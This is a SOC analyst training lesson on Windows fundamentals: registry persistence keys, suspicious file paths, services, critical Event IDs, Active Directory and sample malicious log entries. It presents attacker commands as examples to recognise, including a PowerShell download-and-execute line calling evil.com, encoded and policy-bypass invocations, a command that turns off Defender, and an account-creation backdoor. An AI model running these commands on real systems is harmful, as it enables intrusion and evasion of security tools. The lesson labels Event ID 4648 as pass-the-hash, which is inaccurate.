# Lesson 2.1 — Windows Basics for SOC Analysts

**Phase:** 2 — IT & Networking Foundations
**Prerequisite:** All Phase 1 lessons
**Time to complete:** 40 minutes

---

## Why Windows Matters Most in SOC

Before getting into the details, understand this: approximately 85–90% of enterprise environments run Windows. Most attacks target Windows. Most logs you will read will come from Windows systems.

Learning Windows is not optional — it is the core of SOC work.

---

## Windows Key Concepts

### Users and Groups

Windows organizes access around users and groups.

A user account is an identity: john.smith, sarah.jones, administrator.
Every user has a username and password.
Every user has a Security Identifier (SID) — a unique internal ID that Windows uses to track the account regardless of username changes.

Groups are collections of users that share the same permissions:
- Domain Users — all normal employees
- Domain Admins — highly privileged accounts that manage the domain
- Administrators (local) — can fully control one specific computer
- Remote Desktop Users — can connect remotely via RDP

Why this matters for SOC:
When you see a suspicious action in a log, one of the first questions is:
"What privileges did the account have when this happened?"
An attacker with a regular user account is dangerous. An attacker who has compromised a Domain Admin account has complete control of the entire organization.

### The Registry

The Windows Registry is a central database that stores settings for the operating system and applications.

Think of it as the brain's memory — Windows and every installed program store their configuration here.

Attackers love the registry because:
1. Persistence: Malware adds itself to specific registry locations so it starts automatically every time Windows boots.
2. Configuration: Malware stores its settings (like the C2 server address) in the registry.
3. Lateral movement: Certain registry settings can be abused to run code remotely.

Key registry locations to know:
```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```
These locations contain programs that run automatically at startup. Malware often adds itself here.

### The File System

Windows organizes files in a tree structure:

```
C:\                              (root drive)
├── Windows\                     (operating system files)
│   ├── System32\               (critical system files — always inspect processes here)
│   └── SysWOW64\               (32-bit compatibility)
├── Program Files\              (installed applications)
├── Program Files (x86)\        (32-bit installed apps)
├── Users\                      (all user home directories)
│   ├── john.smith\
│   │   ├── Desktop\
│   │   ├── Documents\
│   │   ├── Downloads\
│   │   └── AppData\            (hidden folder — commonly used by malware)
│   │       ├── Local\
│   │       ├── LocalLow\
│   │       └── Roaming\        (syncs across domain — heavily abused)
└── Temp\                       (temporary files — malware often drops here)
```

Critical locations attackers use:
- C:\Users\[user]\AppData\Roaming\ — hidden, syncs across devices
- C:\Users\[user]\AppData\Local\Temp\ — temporary, less monitored
- C:\Windows\Temp\ — temp location with write access
- C:\ProgramData\ — shared application data

If you see a process running from AppData or Temp instead of Program Files or System32, that is suspicious.

### Windows Services

Services are programs that run in the background, often without a user logged in.

Examples:
- Windows Update service
- Print Spooler service
- Windows Defender service

Services run as a specific account. Common service accounts:
- SYSTEM — highest privilege on the local machine
- LOCAL SERVICE — reduced privileges
- NETWORK SERVICE — can access network resources

Attackers abuse services for persistence:
- Creating a malicious service that starts automatically
- Modifying an existing service to run malicious code

Look for: New services created at unusual times, services with suspicious names, services running executables from user directories.

### Windows Event Log

The Windows Event Log records everything that happens on the system.

Event logs are organized into channels:
- Security — login/logout, privilege use, file access, policy changes
- System — hardware events, service start/stop, OS errors
- Application — application-specific events
- PowerShell/Microsoft-Windows-PowerShell/Operational — PowerShell activity
- Sysmon (if installed) — detailed process and network events

Each event has:
- Event ID — the type of event (e.g., 4624 = logon success)
- Time Generated — when it happened
- Computer — which machine generated it
- User — which account was involved
- Additional data — specific to the event type

Critical Event IDs to memorize:

4624 — Account logged on successfully
4625 — Account failed to log on
4634 — Account logged off
4648 — Logon using explicit credentials (pass-the-hash technique)
4688 — New process created
4698 — Scheduled task created
4720 — User account created
4722 — User account enabled
4724 — Attempt to reset an account's password
4728 — Member added to a security-enabled global group
4732 — Member added to a local group
4740 — User account locked out
4756 — Member added to a universal security group
4768 — Kerberos TGT requested
4769 — Kerberos service ticket requested
4776 — NTLM authentication attempt
7045 — New service installed

You will work with all of these in Phase 8.

---

## Windows Command Line Tools

SOC analysts need to know these commands because:
1. You use them to investigate computers
2. Attackers use them — knowing what each does helps you understand what an attacker was doing

### Command Prompt (cmd.exe)

```
whoami         — Shows current username
ipconfig       — Shows IP address configuration
netstat -an    — Shows active network connections
tasklist       — Lists running processes
dir            — Lists files in current directory
systeminfo     — Shows system information
net user       — Lists user accounts
net localgroup administrators — Lists local administrators
```

### PowerShell (powershell.exe)

PowerShell is far more powerful than cmd and is heavily abused by attackers.

Common legitimate uses:
```powershell
Get-Process           — List running processes
Get-Service           — List services
Get-EventLog          — Read event logs
Get-NetTCPConnection  — Show network connections
```

Common attacker uses:
```powershell
# Download and execute a file from the internet
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')

# Encoded command (hides the real command)
powershell.exe -enc JABjAGwAaQBlAG4AdAA...

# Bypass execution policy
powershell.exe -ExecutionPolicy Bypass -File script.ps1

# Disable antivirus
Set-MpPreference -DisableRealtimeMonitoring $true
```

When you see PowerShell in a log:
- What is it executing?
- Is there a -enc (encoded) flag? If so, the command is hidden — suspicious.
- Is it downloading from the internet?
- Is it disabling security tools?
- Who triggered it and from what parent process?

---

## Active Directory (Brief Introduction)

Active Directory (AD) is Microsoft's directory service — the central management system for Windows enterprise environments.

AD manages:
- All user accounts
- All computers
- All groups
- Security policies (Group Policy Objects / GPOs)
- Authentication (Kerberos — covered in Phase 4)

Key AD concepts:

Domain Controller (DC) — The server that runs Active Directory. The most critical server in the organization. If an attacker compromises the DC, they own everything.

Domain — The organizational boundary (company.com)

Organizational Unit (OU) — Subdivision within the domain (Sales OU, IT OU, Finance OU)

Group Policy Object (GPO) — Rules pushed to computers and users (password requirements, screensaver settings, software installation, etc.)

LDAP (Lightweight Directory Access Protocol) — The protocol used to query Active Directory.

Why AD is critical for SOC:
- All authentication goes through AD
- All user management happens in AD
- AD logs tell you about login attempts, privilege changes, and group membership changes
- Attackers' primary goal is often to compromise AD to get domain-wide access
- Attacks against AD include: Kerberoasting, Pass-the-Hash, DCSync, Golden Ticket

You will learn these attacks in detail in later phases.

---

## Real Examples

Example 1 — Persistence via Registry:
```
EventID: 12 (Registry key set — via Sysmon)
Time: 2024-03-15 02:33:14
Computer: LAPTOP-JSMITH
Key: HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Value Name: WindowsHelper
Value Data: C:\Users\jsmith\AppData\Roaming\winhlp.exe
```
An attacker added a program to the Run registry key. Every time the user logs in, winhlp.exe will execute automatically. The file is in AppData, which is suspicious.

Example 2 — PowerShell Download:
```
EventID: 4688 (Process created)
Time: 2024-03-15 14:22:47
Computer: LAPTOP-JSMITH
Creator: winword.exe
New Process: powershell.exe
Command Line: powershell.exe -exec bypass -w hidden -enc 
              JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0
```
Word spawned PowerShell with an encoded command and hidden window. Classic malware delivery.

Example 3 — New Admin Account Created:
```
EventID: 4720 — User account created
Time: 2024-03-15 03:14:22
Computer: DC01
Actor: SYSTEM
New Account: support_admin
```
```
EventID: 4732 — Member added to local group
Time: 2024-03-15 03:14:23
Group: Administrators
Member: support_admin
```
A new account was created at 3 AM by SYSTEM and immediately added to Administrators. This is almost certainly a backdoor created by an attacker who has already compromised the system.

---

## Common Mistakes Beginners Make

Mistake 1: Not knowing where legitimate programs live.
Reality: Know the normal file paths. svchost.exe belongs in C:\Windows\System32\. If it is elsewhere, investigate.

Mistake 2: Ignoring PowerShell logs.
Reality: PowerShell is the attacker's Swiss Army knife. Every PowerShell command should be treated with care.

Mistake 3: Not knowing the critical Event IDs.
Reality: Memorize at least the dozen most important Event IDs. They are the foundation of Windows log analysis.

Mistake 4: Overlooking the Registry for persistence.
Reality: After finding malware, always check the Run keys and scheduled tasks for persistence mechanisms.

---

## Summary

Windows is the primary operating system in enterprise environments.
Key concepts: users, groups, registry, file system, services, event logs.
The Windows Event Log is your primary evidence source — know the critical Event IDs.
PowerShell is heavily abused by attackers — learn to recognize malicious PowerShell.
Active Directory is the crown jewel — all authentication flows through it.
Know where legitimate files should live so you can spot files in wrong locations.

---

## Practice Questions

**Easy:**
1. What Event ID represents a successful Windows login?
2. What are the Run registry keys used for?
3. What does the -enc flag in a PowerShell command mean?

**Medium:**
4. You see Event ID 4688 showing cmd.exe was spawned by excel.exe. The cmd.exe ran the command "net user hacker Pass123! /add". What happened and how serious is this?
5. A new service was created (Event ID 7045) called "WindowsDefenderUpdate" running from C:\ProgramData\updates\wdu.exe. Is this legitimate? Why or why not?

**Thinking Questions:**
6. An attacker has just gained access to a company's Domain Controller. What three things would they most likely do immediately? Use what you know about Windows and Active Directory.
7. You see PowerShell running with the following flags: -ExecutionPolicy Bypass -WindowStyle Hidden -enc [long encoded string]. Explain each flag and what the combination tells you about the attacker's intent.
